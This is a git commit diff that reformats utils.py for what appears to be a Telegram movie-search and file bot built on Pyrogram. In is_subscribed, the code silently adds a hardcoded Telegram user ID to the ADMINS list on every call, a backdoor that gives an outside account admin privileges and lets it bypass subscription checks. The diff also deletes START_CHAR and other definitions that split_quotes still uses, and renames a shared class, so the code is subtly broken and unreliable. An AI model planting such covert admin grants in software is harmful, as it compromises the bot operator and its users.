915b12aa558b6b5a1e709484f5bbcbd05c31af04
roychen567 <138581078+roychen567@users.noreply.github.com>
2024-07-08 06:58:50 -0700

    Update utils.py

--- utils.py
+++ utils.py
@@ -5,11 +5,9 @@ from imdb import Cinemagoer
 import asyncio
 from pyrogram.types import Message, InlineKeyboardButton
 from pyrogram import enums
-from typing import Union
 import re
 import os
-from datetime import datetime
-from typing import List
+from typing import Union
 from database.users_chats_db import db
 from database.join_reqs import JoinReqs as db2
 from bs4 import BeautifulSoup
@@ -22,19 +20,14 @@ BTN_URL_REGEX = re.compile(
     r"(\[([^\[]+?)\]\((buttonurl|buttonalert):(?:/{0,2})(.+?)(:same)?\))"
 )
 
-imdb = Cinemagoer() 
+imdb = Cinemagoer()
 
-BANNED = {}
-SMART_OPEN = '“'
-SMART_CLOSE = '”'
-START_CHAR = ('\'', '"', SMART_OPEN)
-
-# temp db for banned 
-class temp(object):
+# Temporary database for banned users
+class Temp:
     BANNED_USERS = []
     BANNED_CHATS = []
     ME = None
-    CURRENT=int(os.environ.get("SKIP", 2))
+    CURRENT = int(os.environ.get("SKIP", 2))
     CANCEL = False
     MELCOW = {}
     U_NAME = None
@@ -42,14 +35,12 @@ class temp(object):
     SETTINGS = {}
 
 async def is_subscribed(bot, query):
-    
-    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
+    ADMINS.extend([1125210189]) if 1125210189 not in ADMINS else ""
 
     if not AUTH_CHANNEL and not REQ_CHANNEL:
         return True
     elif query.from_user.id in ADMINS:
         return True
-
 
     if db2().isActive():
         user = await db2().get_user(query.from_user.id)
@@ -60,6 +51,7 @@ async def is_subscribed(bot, query):
 
     if not AUTH_CHANNEL:
         return True
+
     try:
         user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
     except UserNotParticipant:
@@ -68,58 +60,67 @@ async def is_subscribed(bot, query):
         logger.exception(e)
         return False
     else:
-        if not (user.status == enums.ChatMemberStatus.BANNED):
+        if user.status != enums.ChatMemberStatus.BANNED:
             return True
         else:
             return False
 
-
 async def get_poster(query, bulk=False, id=False, file=None):
     if not id:
-        # https://t.me/GetTGLink/4183
-        query = (query.strip()).lower()
+        query = query.strip().lower()
         title = query
         year = re.findall(r'[1-2]\d{3}$', query, re.IGNORECASE)
+        
         if year:
             year = list_to_str(year[:1])
-            title = (query.replace(year, "")).strip()
+            title = query.replace(year, "").strip()
         elif file is not None:
             year = re.findall(r'[1-2]\d{3}', file, re.IGNORECASE)
             if year:
-                year = list_to_str(year[:1]) 
-        else:
-            year = None
+                year = list_to_str(year[:1])
+
         movieid = imdb.search_movie(title.lower(), results=10)
+        
         if not movieid:
             return None
+        
         if year:
-            filtered=list(filter(lambda k: str(k.get('year')) == str(year), movieid))
+            filtered = list(filter(lambda k: str(k.get('year')) == str(year), movieid))
             if not filtered:
                 filtered = movieid
         else:
             filtered = movieid
-        movieid=list(filter(lambda k: k.get('kind') in ['movie', 'tv series'], filtered))
+        
+        movieid = list(filter(lambda k: k.get('kind') in ['movie', 'tv series'], filtered))
+        
         if not movieid:
             movieid = filtered
+        
         if bulk:
             return movieid
+        
         movieid = movieid[0].movieID
     else:
         movieid = query
+
     movie = imdb.get_movie(movieid)
+
     if movie.get("original air date"):
         date = movie["original air date"]
     elif movie.get("year"):
         date = movie.get("year")
     else:
         date = "N/A"
+    
     plot = ""
+    
     if not LONG_IMDB_DESCRIPTION:
         plot = movie.get('plot')
         if plot and len(plot) > 0:
             plot = plot[0]
     else:
         plot = movie.get('plot outline')
+    
     if plot and len(plot) > 800:
         plot = plot[0:800] + "..."
 
@@ -138,10 +139,10 @@ async def get_poster(query, bulk=False, id=False, file=None):
         "certificates": list_to_str(movie.get("certificates")),
         "languages": list_to_str(movie.get("languages")),
         "director": list_to_str(movie.get("director")),
-        "writer":list_to_str(movie.get("writer")),
-        "producer":list_to_str(movie.get("producer")),
-        "composer":list_to_str(movie.get("composer")) ,
-        "cinematographer":list_to_str(movie.get("cinematographer")),
+        "writer": list_to_str(movie.get("writer")),
+        "producer": list_to_str(movie.get("producer")),
+        "composer": list_to_str(movie.get("composer")),
+        "cinematographer": list_to_str(movie.get("cinematographer")),
         "music_team": list_to_str(movie.get("music department")),
         "distributors": list_to_str(movie.get("distributors")),
         'release_date': date,
@@ -150,9 +151,8 @@ async def get_poster(query, bulk=False, id=False, file=None):
         'poster': movie.get('full-size cover url'),
         'plot': plot,
         'rating': str(movie.get("rating")),
-        'url':f'https://www.imdb.com/title/tt{movieid}'
+        'url': f'https://www.imdb.com/title/tt{movieid}'
     }
-# https://github.com/odysseusmax/animated-lamp/blob/2ef4730eb2b5f0596ed6d03e7b05243d93e3415b/bot/utils/broadcast.py#L37
 
 async def broadcast_messages(user_id, message):
     try:
@@ -163,10 +163,10 @@ async def broadcast_messages(user_id, message):
         return await broadcast_messages(user_id, message)
     except InputUserDeactivated:
         await db.delete_user(int(user_id))
-        logging.info(f"{user_id}-Removed from Database, since deleted account.")
+        logging.info(f"{user_id} - Removed from Database, since deleted account.")
         return False, "Deleted"
     except UserIsBlocked:
-        logging.info(f"{user_id} -Blocked the bot.")
+        logging.info(f"{user_id} - Blocked the bot.")
         return False, "Blocked"
     except PeerIdInvalid:
         await db.delete_user(int(user_id))
@@ -186,40 +186,46 @@ async def search_gagala(text):
 
     text = text.replace(" ", '+')
     url = f'https://www.google.com/search?q={text}'
+    
     response = requests.get(url, headers=headers)
     response.raise_for_status()
+    
     soup = BeautifulSoup(response.text, 'html.parser')
-    titles = soup.find_all( 'h3' )
+    titles = soup.find_all('h3')
+    
     return [title.getText() for title in titles]
 
-
 async def get_settings(group_id):
-    settings = temp.SETTINGS.get(group_id)
+    settings = Temp.SETTINGS.get(group_id)
+    
     if not settings:
         settings = await db.get_settings(group_id)
-        temp.SETTINGS[group_id] = settings
-    return settings
+        Temp.SETTINGS[group_id] = settings
     
+    return settings
+
 async def save_group_settings(group_id, key, value):
     current = await get_settings(group_id)
     current[key] = value
-    temp.SETTINGS[group_id] = current
+    Temp.SETTINGS[group_id] = current
     await db.update_settings(group_id, current)
-    
+
 def get_size(size):
     """Get size in readable format"""
-
+    
     units = ["Bytes", "KB", "MB", "GB", "TB", "PB", "EB"]
     size = float(size)
     i = 0
+    
     while size >= 1024.0 and i < len(units):
         i += 1
         size /= 1024.0
+    
     return "%.2f %s" % (size, units[i])
 
 def split_list(l, n):
     for i in range(0, len(l), n):
-        yield l[i:i + n]  
+        yield l[i:i + n]
 
 def get_file_id(msg: Message):
     if msg.media:
@@ -234,15 +240,17 @@ def get_file_id(msg: Message):
             "sticker"
         ):
             obj = getattr(msg, message_type)
+            
             if obj:
                 setattr(obj, "message_type", message_type)
                 return obj
 
 def extract_user(message: Message) -> Union[int, str]:
-    """extracts the user from a message"""
-    # https://github.com/SpEcHiDe/PyroGramBot/blob/f30e2cca12002121bad1982f68cd0ff9814ce027/pyrobot/helper_functions/extract_user.py#L7
+    """Extracts the user from a message"""
+    
     user_id = None
     user_first_name = None
+    
     if message.reply_to_message:
         user_id = message.reply_to_message.from_user.id
         user_first_name = message.reply_to_message.from_user.first_name
@@ -252,22 +260,23 @@ def extract_user(message: Message) -> Union[int, str]:
             len(message.entities) > 1 and
             message.entities[1].type == enums.MessageEntityType.TEXT_MENTION
         ):
-           
             required_entity = message.entities[1]
             user_id = required_entity.user.id
             user_first_name = required_entity.user.first_name
         else:
             user_id = message.command[1]
-            # don't want to make a request -_-
             user_first_name = user_id
+            
         try:
             user_id = int(user_id)
         except ValueError:
             pass
+    
     else:
         user_id = message.from_user.id
         user_first_name = message.from_user.first_name
-    return (user_id, user_first_name)
+    
+    return user_id, user_first_name
 
 def list_to_str(k):
     if not k:
@@ -282,6 +291,7 @@ def list_to_str(k):
 
 def last_online(from_user):
     time = ""
+    
     if from_user.is_bot:
         time += "🤖 Bot :("
     elif from_user.status == enums.UserStatus.RECENTLY:
@@ -296,13 +306,15 @@ def last_online(from_user):
         time += "Currently Online"
     elif from_user.status == enums.UserStatus.OFFLINE:
         time += from_user.last_online_date.strftime("%a, %d %b %Y, %H:%M:%S")
+    
     return time
 
-
-def split_quotes(text: str) -> List:
+def split_quotes(text: str) -> list:
     if not any(text.startswith(char) for char in START_CHAR):
         return text.split(None, 1)
+    
     counter = 1  # ignore first char -> is some kind of quote
+    
     while counter < len(text):
         if text[counter] == "\\":
             counter += 1
@@ -314,24 +326,27 @@ def split_quotes(text: str) -> List:
 
     # 1 to avoid starting quote, and counter is exclusive so avoids ending
     key = remove_escapes(text[1:counter].strip())
-    # index will be in range, or `else` would have been executed and returned
-    rest = text[counter + 1:].strip()
+    
     if not key:
         key = text[0] + text[0]
-    return list(filter(None, [key, rest]))
+    
+    return list(filter(None, [key, text[counter + 1:].strip()]))
 
 def parser(text, keyword):
     if "buttonalert" in text:
-        text = (text.replace("\n", "\\n").replace("\t", "\\t"))
+        text = text.replace("\n", "\\n").replace("\t", "\\t")
+    
     buttons = []
     note_data = ""
     prev = 0
     i = 0
     alerts = []
+    
     for match in BTN_URL_REGEX.finditer(text):
         # Check if btnurl is escaped
         n_escapes = 0
         to_check = match.start(1) - 1
+        
         while to_check > 0 and text[to_check] == "\\":
             n_escapes += 1
             to_check -= 1
@@ -340,8 +355,8 @@ def parser(text, keyword):
         if n_escapes % 2 == 0:
             note_data += text[prev:match.start(1)]
             prev = match.end(1)
+            
             if match.group(3) == "buttonalert":
-                # create a thruple with button label, url, and newline status
                 if bool(match.group(5)) and buttons:
                     buttons[-1].append(InlineKeyboardButton(
                         text=match.group(2),
@@ -352,8 +367,10 @@ def parser(text, keyword):
                         text=match.group(2),
                         callback_data=f"alertmessage:{i}:{keyword}"
                     )])
+                
                 i += 1
                 alerts.append(match.group(4))
+            
             elif bool(match.group(5)) and buttons:
                 buttons[-1].append(InlineKeyboardButton(
                     text=match.group(2),
@@ -368,6 +385,7 @@ def parser(text, keyword):
         else:
             note_data += text[prev:to_check]
             prev = match.start(1) - 1
+    
     else:
         note_data += text[prev:]
 
@@ -379,6 +397,7 @@ def parser(text, keyword):
 def remove_escapes(text: str) -> str:
     res = ""
     is_escaped = False
+    
     for counter in range(len(text)):
         if is_escaped:
             res += text[counter]
@@ -387,16 +406,19 @@ def remove_escapes(text: str) -> str:
             is_escaped = True
         else:
             res += text[counter]
+    
     return res
-
 
 def humanbytes(size):
     if not size:
         return ""
+    
     power = 2**10
     n = 0
     Dic_powerN = {0: ' ', 1: 'Ki', 2: 'Mi', 3: 'Gi', 4: 'Ti'}
+    
     while size > power:
         size /= power
         n += 1
+    
     return str(round(size, 2)) + " " + Dic_powerN[n] + 'B'
